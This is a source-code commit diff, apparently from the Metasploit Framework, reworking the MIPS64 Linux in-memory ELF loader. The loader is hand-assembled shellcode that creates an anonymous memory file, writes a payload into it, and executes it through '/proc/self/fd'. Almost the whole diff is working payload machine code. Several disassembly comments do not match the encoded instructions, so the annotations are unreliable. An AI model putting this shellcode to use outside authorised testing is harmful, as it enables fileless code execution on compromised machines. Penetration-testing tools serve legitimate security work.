064e224c3d70b60e36f926b7a97381574c62acf1
dledda-r7 <diego_ledda@rapid7.com>
2025-11-18 08:34:36 -0500

    fix: rollback itoa and execve instead of execveat

--- lib/msf/core/payload/linux/mips64/elf_loader.rb
+++ lib/msf/core/payload/linux/mips64/elf_loader.rb
@@ -16,38 +16,60 @@ module Msf::Payload::Linux::Mips64::ElfLoader
     size_h = size >> 16
     size_l = size & 0x0000ffff
     in_memory_loader = [
-      # "call" 0x1004, address of the next instruction is stored in $ra
-      0x04110000, # 0x1000:	bal	0x1004	0x04110000
-      0x00000000, # 0x1004:	nop		0x00000000
-
-      # fd = memfd_create(NULL,MFD_CLOEXEC)
-      0x03e02025, # 0x1008:	move	$a0, $ra	0x03e02025
-      0x27ff005c, # 0x100c:	addiu	$ra, $ra, 0x5c	0x27ff005c
-      0x2419fffe, # 0x1010:	addiu	$t9, $zero, -2	0x2419fffe
-      0x03202827, # 0x1014:	not	$a1, $t9	0x03202827
-      0x240214c2, # 0x1018:	addiu	$v0, $zero, 0x14c2	0x240214c2
-      0x0101010c, # 0x101c:	syscall	0x40404	0x0101010c
-
-      # write(fd, payload length, payload pointer)
-      0x03e02825, # 0x1020:	move	$a1, $ra	0x03e02825
+      # call next instruction to get relative address
+      0x00001025,               #   move    v0,zero
+      0x04510000,               #   bgezal  v0,8 <myself>
+      0x00000000,               #   nop
+      0x00000000,               #   nop
+      # memfd_create("", MFD_CLOEXEC) = fd
+      0x03e02025,               #   move    a0,ra
+      0x27ff00b8,               #   addiu   ra,ra,92
+      0x2419fffe,               #   li      t9,-2
+      0x03202827,               #   nor     a1,t9,zero
+      0x340214c2,               #   li      v0,0x14c2
+      0x0101010c,               #   syscall 0x40404
+      # write(fd, payload, payload_length)
+      0x03e02825,               #   move    a1,ra
       (0x3c06 << 16 | size_h),  #   lui     a2,0x17
       (0x34c6 << 16 | size_l),  #   ori     a2,a2,0x2fb8
-      0x00402025, # 0x102c:	move	$a0, $v0	0x00402025
-      0x0080c825, # 0x1030:	move	$t9, $a0	0x0080c825
-      0x24021389, # 0x1034:	addiu	$v0, $zero, 0x1389	0x24021389
-      0x0101010c, # 0x1038:	syscall	0x40404	0x0101010c
-
-      # execveat(fd, null,null,null, AT_EMPTY_PATH)
-      0x03202025, # 0x103c:	move	$a0, $t9	0x03202025
-      0xafa0fffc, # 0x1040:	sw	$zero, -4($sp)	0xafa0fffc
-      0x27bdfffc, # 0x1044:	addiu	$sp, $sp, -4	0x27bdfffc
-      0x03a02820, # 0x1048:	add	$a1, $sp, $zero	0x03a02820
-      0x00003025, # 0x104c:	move	$a2, $zero	0x00003025
-      0x00003825, # 0x1050:	move	$a3, $zero	0x00003825
-      0x24191000, # 0x1054:	addiu	$t9, $zero, 0x1000	0x24191000
-      0xafb90010, # 0x1058:	sw	$t9, 0x10($sp)	0xafb90010
-      0x240214c4, # 0x105c:	addiu	$v0, $zero, 0x14c4	0x240214c4
-      0x0101010c  # 0x1060:	syscall	0x40404	0x0101010c
+      0x00402025,               #   move    a0,v0
+      0x0080c825,               #   move    t9,a0
+      0x34021389,               #   li      v0,0x1389
+      0x0101010c,               #   syscall 0x40404
+      # custom implementation of itoa
+      0x27e7fffe,               #   addiu   a3,ra,-2
+      0x2418000a,               #   li      t8,10
+      0x24050016,               #   li      a1,23
+      0x13200011,               #   beqz    t9,98 <execve>
+      0x00000000,               #   bnez    t8,60 <itoa+0x10>
+      0x0338001a,               #   div     zero,t9,t8
+      0x00000000,               #   break   0x7
+      0x2401ffff,               #   li      at,-1
+      0x17010004,               #   bne     t8,at,78 <itoa+0x28>
+      0x3c018000,               #   lui     at,0x8000
+      0x17210002,               #   bne     t9,at,78 <itoa+0x28>
+      0x00000000,               #   nop
+      0x00000000,               #   break   0x6
+      0x0000c812,               #   mflo    t9
+      0x0000c812,               #   mflo    t9
+      0x00007810,               #   mfhi    t3
+      0x25ef0030,               #   addiu   t3,t3,48
+      0xa0ef0000,               #   sb      t3,0(a3)
+      0x24a5ffff,               #   addiu   a1,a1,-1
+      0x24e7ffff,               #   addiu   a3,a3,-1
+      0x1000ffee,               #   b       50 <itoa>
+      0x00e52022,               #   sub     a0,a3,a1
+      0x2805ffff,               #   slti    a1,zero,-1
+      0x2806ffff,               #   slti    a2,zero,-1
+      0x340213c1,               #   li      v0,0xfab
+      # execve('/proc/self/fd//////<fd>', 0, 0)
+      0x0101010c,               #   syscall 0x40404
+      0x2f70726f,               #   sltiu   s0,k1,29295
+      0x632f7365,               #   daddi   t3,t9,29541
+      0x6c662f66,               #   ldr     a2,12134(v1)
+      0x642f2f2f,               #   daddiu  t3,at,12079
+      0x2f2f2f2f,               #   sltiu   t3,t9,12079
+      0x2f2f2f00,               #   sltiu   t3,t9,12032
     ].pack('N*')
     in_memory_loader
   end
